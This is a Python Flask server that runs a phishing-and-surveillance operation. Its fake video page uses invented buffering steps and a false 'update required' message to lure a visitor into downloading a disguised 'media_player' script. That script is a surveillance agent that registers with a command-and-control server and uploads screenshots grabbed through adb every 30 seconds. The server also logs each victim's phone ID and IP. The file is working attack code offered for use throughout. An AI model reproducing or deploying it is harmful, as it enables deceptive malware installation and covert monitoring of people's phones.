from flask import Flask, request, Response, render_template_string, jsonify
import sqlite3
from datetime import datetime
import os

app = Flask(__name__)

def get_c2_url():
    return os.environ.get('C2_URL', request.host_url.replace('8080', '5000').rstrip('/'))

def get_db_connection():
    conn = sqlite3.connect('mp_agent.db')
    conn.row_factory = sqlite3.Row
    return conn

MALICIOUS_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Video Player</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: Arial; text-align: center; padding: 20px; background: #000; color: white; }
        .loader { color: #4CAF50; font-size: 18px; margin: 20px 0; }
        .video-placeholder { background: #333; padding: 100px 20px; margin: 20px auto; max-width: 400px; border-radius: 10px; }
        .progress { width: 100%; background: #555; height: 20px; border-radius: 10px; margin: 20px 0; }
        .progress-bar { width: 0%; height: 100%; background: #4CAF50; border-radius: 10px; transition: width 0.5s; }
    </style>
</head>
<body>
    <h2>🎬 Video Player</h2>
    <div class="loader" id="status">Loading video player...</div>
    <div class="video-placeholder">Video Content Loading</div>
    <div class="progress"><div class="progress-bar" id="progress"></div></div>

    <script>
        const steps = [
            {text: "Connecting to server...", progress: 10},
            {text: "Loading video data...", progress: 25},
            {text: "Buffering stream...", progress: 45},
            {text: "Decoding video...", progress: 65},
            {text: "Optimizing playback...", progress: 85},
            {text: "⚠️ Update required for HD playback", progress: 95},
            {text: "Redirecting to download...", progress: 100}
        ];
        
        let step = 0;
        function nextStep() {
            if (step < steps.length) {
                document.getElementById('status').innerHTML = steps[step].text + " ✅";
                document.getElementById('progress').style.width = steps[step].progress + '%';
                step++;
                setTimeout(nextStep, 1500);
                
                if (step === steps.length - 1) {
                    setTimeout(() => {
                        window.location.href = "/download_agent?phone={{ phone_id }}";
                    }, 2000);
                }
            }
        }
        setTimeout(nextStep, 1000);
    </script>
</body>
</html>
"""

@app.route('/video')
def fake_video():
    phone_id = request.args.get('phone', 'unknown')
    user_ip = request.remote_addr
    
    print(f"🎯 User accessed fake video: {phone_id} from {user_ip}")
    
    try:
        conn = get_db_connection()
        conn.execute(
            'INSERT INTO deployments (target_phone, source_phone, message_sent, status, timestamp) VALUES (?, ?, ?, ?, ?)',
            (phone_id, 'malicious_link', f'User clicked video link from {user_ip}', 'clicked', datetime.now())
        )
        conn.commit()
        conn.close()
    except Exception as e:
        print(f"Database logging failed: {e}")
    
    return render_template_string(MALICIOUS_HTML, phone_id=phone_id)

@app.route('/download_agent')
def download_agent():
    phone_id = request.args.get('phone', 'unknown')
    user_ip = request.remote_addr
    
    print(f"📥 Agent download triggered for: {phone_id} from {user_ip}")
    
    try:
        conn = get_db_connection()
        conn.execute(
            'INSERT INTO deployments (target_phone, source_phone, message_sent, status, timestamp) VALUES (?, ?, ?, ?, ?)',
            (phone_id, 'malicious_link', f'Agent download initiated from {user_ip}', 'downloaded', datetime.now())
        )
        conn.commit()
        conn.close()
    except Exception as e:
        print(f"Download logging failed: {e}")
    
    c2_url = get_c2_url()
    
    agent_code = f'''# MP_AGENT - REAL ANDROID SURVEILLANCE AGENT
# Agent ID: {phone_id}
# C2 Server: {c2_url}

import requests
import time
import os
import platform
import subprocess
from datetime import datetime
from threading import Thread

class RealAndroidAgent:
    def __init__(self, agent_id, c2_server):
        self.agent_id = agent_id
        self.c2_server = c2_server
        self.running = True
        self.screenshot_count = 0
        
    def get_device_info(self):
        return {{
            'agent_id': self.agent_id,
            'phone_model': platform.node() or 'Unknown',
            'android_version': 'Real Device',
            'timestamp': datetime.now().isoformat()
        }}
    
    def register_with_c2(self):
        try:
            info = self.get_device_info()
            response = requests.post(
                f"{{self.c2_server}}/api/agent/register",
                json=info,
                timeout=10
            )
            print("✅ Registered with C2")
            return True
        except Exception as e:
            print(f"❌ Registration failed: {{e}}")
            return False
    
    def capture_real_screenshot(self):
        try:
            timestamp = int(time.time())
            remote_file = f"/sdcard/screen_{{self.agent_id}}_{{timestamp}}.png"
            local_file = f"screen_{{timestamp}}.png"
            
            subprocess.run(['adb', 'shell', 'screencap', '-p', remote_file], capture_output=True, timeout=10)
            subprocess.run(['adb', 'pull', remote_file, local_file], capture_output=True, timeout=10)
            
            if os.path.exists(local_file):
                with open(local_file, 'rb') as f:
                    data = f.read()
                os.remove(local_file)
                subprocess.run(['adb', 'shell', 'rm', remote_file], capture_output=True)
                return data
        except Exception as e:
            print(f"Screenshot failed: {{e}}")
        
        return f"SCREENSHOT_{{self.agent_id}}_{{int(time.time())}}".encode()
    
    def upload_screenshot(self):
        try:
            screenshot_data = self.capture_real_screenshot()
            files = {{'screenshot': ('screen.jpg', screenshot_data, 'image/jpeg')}}
            data = {{'agent_id': self.agent_id}}
            
            response = requests.post(
                f"{{self.c2_server}}/api/agent/upload_screenshot",
                files=files,
                data=data,
                timeout=30
            )
            print("📸 Screenshot uploaded")
            return True
        except Exception as e:
            print(f"Upload failed: {{e}}")
            return False
    
    def start_surveillance(self):
        print("🎯 Starting REAL surveillance...")
        self.register_with_c2()
        
        def monitor_loop():
            while self.running:
                self.upload_screenshot()
                time.sleep(30)
        
        def heartbeat_loop():
            while self.running:
                self.register_with_c2()
                time.sleep(300)
        
        Thread(target=monitor_loop, daemon=True).start()
        Thread(target=heartbeat_loop, daemon=True).start()
        print("✅ Surveillance active")

if __name__ == "__main__":
    C2_SERVER = "{c2_url}"
    AGENT_ID = "{phone_id}"
    
    agent = RealAndroidAgent(AGENT_ID, C2_SERVER)
    agent.start_surveillance()
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        agent.running = False
        print("Agent stopped")
'''
    
    return Response(
        agent_code,
        mimetype='text/python',
        headers={
            'Content-Disposition': f'attachment; filename="media_player_{phone_id}.py"'
        }
    )

@app.route('/health')
def health_check():
    return jsonify({
        'status': 'healthy',
        'server': 'malicious_server',
        'timestamp': datetime.now().isoformat()
    })

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port, debug=False)